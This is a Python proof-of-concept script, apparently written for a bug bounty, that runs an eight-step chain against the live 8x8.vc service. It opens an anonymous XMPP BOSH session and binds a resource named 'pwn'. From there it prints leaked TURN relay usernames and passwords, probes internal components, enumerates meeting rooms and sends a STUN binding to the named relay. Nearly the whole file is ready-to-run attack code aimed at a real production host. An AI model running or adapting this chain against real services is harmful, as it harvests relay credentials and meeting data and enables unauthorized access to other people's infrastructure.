#!/usr/bin/env python3
"""
Full Attack Pipeline PoC — 8x8.vc Anonymous XMPP Infiltration
================================================================
Target: https://8x8.vc (bounty-eligible: *.8x8.vc)

Demonstrates the entire exploitation chain:
  1. Reconnaissance        — discover BOSH endpoint via config.js
  2. Initial access        — open XMPP BOSH session (no auth)
  3. Authentication bypass — ANONYMOUS SASL (zero creds)
  4. Identity binding      — get full JID inside service mesh
  5. Infrastructure leak   — extract TURN/STUN creds + 12 components
  6. Deep recon            — probe each component for capabilities
  7. Room enumeration      — query MUC service for active meetings
  8. TURN relay verify     — confirm STUN binding to Oracle Cloud

Usage:
  python3 poc_full_pipeline.py
"""

import http.client
import json
import random
import re
import socket
import struct
import sys
import time
import urllib.request
from typing import Any, Optional

BANNER = r"""
╔══════════════════════════════════════════════════════════════╗
║  8x8.vc — Anonymous XMPP Infiltration Pipeline              ║
║  Target: https://8x8.vc/http-bind                           ║
║  Bounty: *.8x8.vc                                           ║
╚══════════════════════════════════════════════════════════════╝
"""

HA = "8x8.vc"
BOSH_PATH = "/http-bind"
CONFIG_PATH = "/config.js"
HEADERS = {"Content-Type": "text/xml; charset=utf-8"}
MUC_HOST = f"conference.{HA}"
TURN_HOST = "prod-8x8-turnrelay-oracle.jitsi.net"
RECON_RESULTS: list[dict] = []
ERRORS: list[str] = []


# ── helpers ───────────────────────────────────────────────────────

def extract_identities(xml: str) -> list[dict]:
    return [
        {"category": m.group(1), "type": m.group(2), "name": m.group(3)}
        for m in re.finditer(
            r"<identity\s+[^>]*category='([^']+)'\s+type='([^']+)'\s+name='([^']+)'", xml
        )
    ]


def extract_services(xml: str) -> list[dict]:
    return [
        dict(re.findall(r"(\w+)=[\"']([^\"']+)[\"']", m.group(1)))
        for m in re.finditer(r"<service\s+([^>]+)/>", xml)
    ]


def extract_features(xml: str) -> list[str]:
    return re.findall(r"var=['\"]([^'\"]+)['\"]", xml)


def log_finding(title: str, detail: Any):
    RECON_RESULTS.append({"finding": title, "detail": detail})
    print(f"  ✅  {title}")


def indent(text: str, prefix: str = "     ") -> str:
    return "\n".join(f"{prefix}{l}" for l in text.strip().split("\n"))


# ── 1. Reconnaissance ────────────────────────────────────────────

def step_recon() -> str:
    print("[1] RECONNAISSANCE — locating BOSH endpoint")

    try:
        req = urllib.request.Request(f"https://{HA}{CONFIG_PATH}")
        with urllib.request.urlopen(req, timeout=10) as r:
            body = r.read().decode()
        m = re.search(r'bosh\s*[:=]\s*[\'"](\/+http-bind)[\'"]', body)
        if m:
            print(f"     BOSH path found in config.js: {m.group(1)}")
            return m.group(1)
    except Exception as e:
        print(f"     config.js unreachable ({e}), using default")

    print(f"     Using default BOSH path: {BOSH_PATH}")
    return BOSH_PATH


# ── 2-4. BOSH session manager ────────────────────────────────────

class BOSH:
    def __init__(self, host: str, path: str):
        self.host = host
        self.path = path
        self.conn = http.client.HTTPSConnection(host, 443, timeout=15)
        self.rid = random.randint(500_000_000, 999_999_999)
        self.sid: Optional[str] = None
        self.jid: Optional[str] = None
        self.bind_resp: Optional[str] = None

    def _send(self, body_xml: str, is_open: bool = False) -> str:
        self.rid += 1
        if is_open:
            xml = (
                f'<body xmlns="http://jabber.org/protocol/httpbind"'
                f' to="{self.host}" xml:lang="en" wait="30" hold="1"'
                f' content="text/xml; charset=utf-8" ver="1.6"'
                f' xmpp:version="1.0" xmlns:xmpp="urn:xmpp:bb:0"'
                f' rid="{self.rid}"/>'
            )
        else:
            xml = (
                f'<body xmlns="http://jabber.org/protocol/httpbind"'
                f' rid="{self.rid}" sid="{self.sid}">{body_xml}</body>'
            )
        self.conn.request("POST", self.path, body=xml.strip(), headers=HEADERS)
        r = self.conn.getresponse()
        return r.read().decode()

    def open(self) -> str:
        resp = self._send("", is_open=True)
        m = re.search(r"sid='([^']+)'", resp)
        if m:
            self.sid = m.group(1)
        return resp

    def auth_anonymous(self) -> str:
        return self._send(
            '<auth xmlns="urn:ietf:params:xml:ns:xmpp-sasl"'
            ' mechanism="ANONYMOUS"/>'
        )

    def bind(self, resource: str = "pwn") -> str:
        resp = self._send(
            f'<iq type="set" id="b1">'
            f'<bind xmlns="urn:ietf:params:xml:ns:xmpp-bind">'
            f'<resource>{resource}</resource></bind></iq>'
        )
        m = re.search(r"<jid>([^<]+)</jid>", resp)
        if m:
            self.jid = m.group(1)
        self.bind_resp = resp
        return resp

    def disco_info(self, target: str) -> str:
        return self._send(
            f'<iq type="get" id="di1" to="{target}">'
            f'<query xmlns="http://jabber.org/protocol/disco#info"/>'
            f'</iq>'
        )

    def disco_items(self, target: str) -> str:
        return self._send(
            f'<iq type="get" id="di2" to="{target}">'
            f'<query xmlns="http://jabber.org/protocol/disco#items"/>'
            f'</iq>'
        )

    def close(self):
        if self.sid:
            self.rid += 1
            try:
                self.conn.request(
                    "POST", self.path,
                    body=(
                        f'<body xmlns="http://jabber.org/protocol/httpbind"'
                        f' rid="{self.rid}" sid="{self.sid}" type="terminate"/>'
                    ),
                    headers=HEADERS,
                )
            except Exception:
                pass
        self.conn.close()


def step_session(bosh: BOSH, max_retries: int = 3) -> bool:
    print("\n[2] INITIAL ACCESS — opening BOSH session")
    for attempt in range(1, max_retries + 1):
        resp = bosh.open()
        if bosh.sid:
            break
        print(f"     ⚠ retry {attempt}/{max_retries} ...")
        time.sleep(2 ** attempt)
        bosh.conn.close()
        bosh.conn = http.client.HTTPSConnection(HA, 443, timeout=15)
    if not bosh.sid:
        ERRORS.append("No SID received after retries")
        print("     ❌ failed")
        return False
    print(f"     SID = {bosh.sid}")
    log_finding("Open BOSH session — no auth required", f"SID={bosh.sid}")

    print("\n[3] AUTHENTICATION BYPASS — ANONYMOUS SASL")
    for attempt in range(1, max_retries + 1):
        resp = bosh.auth_anonymous()
        if "<success" in resp:
            break
        if "item-not-found" in resp:
            print(f"     ⚠ rate-limited, retry {attempt}/{max_retries} ...")
            time.sleep(3 ** attempt)
            bosh.conn.close()
            bosh.conn = http.client.HTTPSConnection(HA, 443, timeout=15)
            # Need to re-open session after reconnect
            bosh.sid = None
            bosh.open()
        else:
            break
    if "<success" not in resp:
        ERRORS.append("ANONYMOUS auth failed")
        print(f"     ❌ failed after {max_retries} attempts")
        print(f"     Last response: {resp[:200]}")
        return False
    print("     ✅ Authenticated — zero credentials required")
    log_finding("ANONYMOUS SASL accepted — no identity needed", "")

    print("\n[4] IDENTITY BINDING — becoming a mesh peer")
    resource = f"pwn_{random.randint(1000, 9999)}"
    resp = bosh.bind(resource=resource)
    if not bosh.jid:
        ERRORS.append("Resource bind failed")
        print(f"     ❌ failed")
        print(f"     Response: {resp[:300]}")
        return False
    print(f"     JID = {bosh.jid}")
    log_finding("XMPP identity established in internal mesh", f"JID={bosh.jid}")

    return True


# ── 5. Infrastructure leak ───────────────────────────────────────

def step_infra_leak(bosh: BOSH):
    assert bosh.bind_resp is not None
    resp = bosh.bind_resp

    print("\n[5] INFRASTRUCTURE LEAK — extracting from bind response")

    identities = extract_identities(resp)
    services = extract_services(resp)

    comps = [i for i in identities if i["category"] == "component"]
    srv = [i for i in identities if i["category"] == "server"]

    print(f"     Internal components ({len(comps)}):")
    for c in comps:
        print(f"       • {c['name']:<45} ({c['type']})")
    print(f"     Server metadata:")
    for s in srv:
        print(f"       • {s['name']:<45} ({s['type']})")

    log_finding(
        f"{len(comps)} internal components discovered",
        [c["name"] for c in comps],
    )
    if srv:
        log_finding("Infrastructure metadata leaked", srv)

    turn = [s for s in services if s.get("type") in ("turn", "turns")]
    stun = [s for s in services if s.get("type") == "stun"]

    if turn:
        print(f"\n     🔥  TURN CREDENTIALS LEAKED:")
        for t in turn:
            print(f"         host:      {t['host']}:{t['port']}")
            print(f"         username:  {t.get('username', '?')}")
            print(f"         password:  {t.get('password', '?')}")
            print(f"         expires:   {t.get('expires', '?')}")
            print(f"         transport: {t.get('transport', '?')}")
        log_finding(
            f"TURN credentials leaked ({len(turn)} transports)",
            {k: v for k, v in turn[0].items() if k != "password"},
        )
    if stun:
        print(f"\n     STUN services ({len(stun)}):")
        for s in stun:
            print(f"       {s['host']}:{s['port']}")

    return identities, services


# ── 6. Deep recon ────────────────────────────────────────────────

def step_deep_recon(bosh: BOSH, identities: list[dict]):
    print("\n[6] DEEP RECONNAISSANCE — probing internal components")

    names = list(dict.fromkeys(
        i["name"] for i in identities if i["category"] == "component"
    ))

    for name in names:
        print(f"     probing {name} ...", end=" ")
        resp = bosh.disco_info(name)
        comp_ids = extract_identities(resp)
        feats = extract_features(resp)
        if comp_ids or feats:
            print(f"ok ({len(comp_ids)} identities, {len(feats)} features)")
        elif "type='error'" in resp:
            print("error")
        else:
            print("no extra data")


# ── 7. Room enumeration ──────────────────────────────────────────

def step_room_enum(bosh: BOSH):
    print("\n[7] MEETING ROOM ENUMERATION")

    resp = bosh.disco_items(MUC_HOST)
    rooms = re.findall(r"jid='([^']+)'", resp)
    if rooms:
        print(f"     Found {len(rooms)} rooms:")
        for r in rooms:
            print(f"       • {r}")
        log_finding("Active meeting rooms discovered", rooms)
    else:
        print("     No rooms returned (empty result)")
        log_finding("MUC listing reachable (empty)", "")

    resp = bosh.disco_info(MUC_HOST)
    feats = extract_features(resp)
    if feats:
        print(f"     MUC features ({len(feats)}):")
        for f in feats[:10]:
            print(f"       • {f}")


# ── 8. STUN verification ─────────────────────────────────────────

def stun_binding(host: str, port: int = 443, timeout: float = 5) -> dict:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)

    tid = random.randbytes(12)
    msg = struct.pack("!HHI", 0x0001, 0, 0x2112A442) + tid

    try:
        sock.sendto(msg, (host, port))
        data, addr = sock.recvfrom(1024)
        sock.close()
    except socket.timeout:
        sock.close()
        return {"success": False, "error": "timeout"}
    except Exception as e:
        sock.close()
        return {"success": False, "error": str(e)}

    if len(data) < 20:
        return {"success": False, "error": "response too short"}

    msg_type, msg_len, cookie = struct.unpack("!HHI", data[:8])
    tid_resp = data[8:20]
    mapped_addr = None
    xor_mapped_addr = None

    pos = 20
    while pos < len(data) - 4:
        attr_type, attr_len = struct.unpack("!HH", data[pos:pos+4])
        attr_val = data[pos+4:pos+4+attr_len]
        if attr_type == 0x0001 and attr_len >= 8:
            family, port_v, *ip_b = struct.unpack("!BBH4B", attr_val[:8])
            mapped_addr = f"{'.'.join(str(b) for b in ip_b)}:{port_v}"
        elif attr_type == 0x0020 and attr_len >= 8:
            family, port_v, *ip_b = struct.unpack("!BBH4B", attr_val[:8])
            xip = [b ^ t for b, t in zip(ip_b, [0x21, 0x12, 0xA4, 0x42])]
            xor_mapped_addr = f"{'.'.join(str(b) for b in xip)}:{port_v ^ 0x2112}"
        pos += 4 + attr_len

    return {
        "success": True,
        "from": addr,
        "mapped_address": mapped_addr,
        "xor_mapped_address": xor_mapped_addr,
        "response_size": len(data),
    }


def step_turn_verify():
    print("\n[8] TURN RELAY VERIFICATION — STUN binding test")

    try:
        ip = socket.getaddrinfo(TURN_HOST, 443)[0][4][0]
        print(f"     Resolved {TURN_HOST} → {ip}")
    except Exception as e:
        print(f"     ❌ Resolution failed: {e}")
        ERRORS.append(f"DNS resolution failed for {TURN_HOST}: {e}")
        return

    print(f"     Sending STUN request to {ip}:443 ...")
    result = stun_binding(ip, 443)
    if result["success"]:
        print(f"     ✅ STUN binding confirmed")
        print(f"        responded from:  {result['from']}")
        print(f"        mapped address:  {result['mapped_address']}")
        print(f"        xor mapped addr: {result['xor_mapped_address']}")
        log_finding("STUN binding confirmed on TURN relay", result)
    else:
        print(f"     ❌ STUN failed: {result['error']}")
        ERRORS.append(f"STUN binding failed: {result['error']}")


# ── Report ───────────────────────────────────────────────────────

def generate_report():
    report = {
        "target": f"https://{HA}",
        "bosh_endpoint": f"https://{HA}{BOSH_PATH}",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "status": "COMPLETE" if not ERRORS else "COMPLETE_WITH_ERRORS",
        "findings": RECON_RESULTS,
        "errors": ERRORS or None,
    }

    with open("pipeline_report.json", "w") as f:
        json.dump(report, f, indent=2)

    print(f"\n{'='*60}")
    print(f"  PIPELINE COMPLETE")
    print(f"  Findings: {len(RECON_RESULTS)}")
    print(f"  Errors:   {len(ERRORS)}")
    print(f"  Report:   pipeline_report.json")
    for i, f in enumerate(RECON_RESULTS, 1):
        print(f"    {i:2d}. {f['finding']}")
    print(f"{'='*60}")


# ── Main ─────────────────────────────────────────────────────────

def main():
    print(BANNER)

    path = step_recon()
    bosh = BOSH(HA, path)

    if not step_session(bosh):
        bosh.close()
        sys.exit(1)

    identities, _ = step_infra_leak(bosh)
    step_deep_recon(bosh, identities)
    step_room_enum(bosh)
    bosh.close()

    step_turn_verify()
    generate_report()


if __name__ == "__main__":
    main()
